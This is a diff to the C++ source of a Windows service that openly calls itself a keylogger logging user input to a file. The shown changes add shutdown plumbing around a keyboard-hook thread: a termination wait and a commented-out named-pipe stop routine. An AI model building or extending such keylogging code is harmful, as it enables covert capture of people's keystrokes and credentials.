@@ -137,10 +137,6 @@ void KeyloggerService::handleOption(const std::string& name, const std::string& 
 
     if (name == "help")
         _helpRequested = true;
-    else if (name == "run")
-        config().setBool("run", true);
-    //else if (name == "uninstall")
-    //    uninstallService();
 }
 
 void KeyloggerService::displayHelp()
@@ -151,6 +147,52 @@ void KeyloggerService::displayHelp()
     helpFormatter.setHeader("A keylogger Windows service that logs user input to a file.");
     helpFormatter.format(std::cout);
 }
+
+void KeyloggerService::removelKeyboardHookProcess() {
+    //// Создаем дескриптор канала
+    //HANDLE hPipe;
+    //// Имя канала
+    //LPCWSTR pipeName = L"\\\\.\\pipe\\MyNamedPipe";
+    //// Буфер для записи сообщения
+    //const char* message = "stop";
+
+    //// Подключаемся к серверу
+    //while (1)
+    //{
+    //    hPipe = CreateFile(pipeName, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
+    //    if (hPipe != INVALID_HANDLE_VALUE)
+    //    {
+    //        break;
+    //    }
+    //    if (GetLastError() != ERROR_PIPE_BUSY)
+    //    {
+    //        std::cerr << "Could not open pipe. Error: " << GetLastError() << std::endl;
+    //        return;
+    //    }
+    //    // Если все каналы заняты, ждем, пока будет свободен хотя бы один
+    //    if (!WaitNamedPipe(pipeName, 5000))
+    //    {
+    //        std::cerr << "Could not open pipe. Error: " << GetLastError() << std::endl;
+    //        return;
+    //    }
+    //}
+
+    //// Отправляем данные в канал
+    //DWORD bytesWritten;
+    //if (!WriteFile(hPipe, message, strlen(message) + 1, &bytesWritten, NULL))
+    //{
+    //    std::cerr << "Could not write to pipe. Error: " << GetLastError() << std::endl;
+    //    CloseHandle(hPipe);
+    //    return;
+    //}
+
+    //std::cout << "Message sent to server: " << message << std::endl;
+
+    //// Закрываем дескриптор канала
+    //CloseHandle(hPipe);
+
+}
+
 
 int KeyloggerService::main(const std::vector<std::string>& args)
 {
@@ -164,10 +206,12 @@ int KeyloggerService::main(const std::vector<std::string>& args)
     NullGuardProcessor gProcessor;
     WordProcessor wProcessor(&gProcessor);
     WorkerThread wc(&keyResolver, &wProcessor);
+    // чтобы мы могли остановить сервис нам нужно CreateHookThread сделать detach
     wc.CreateHookThread();
 
-    // Запуск цикла обработки событий
-
+    waitForTerminationRequest();
+    // здесь нужно вызвать у HookThread функцию стоп
+    removelKeyboardHookProcess();
 
     return Application::EXIT_OK;
 }
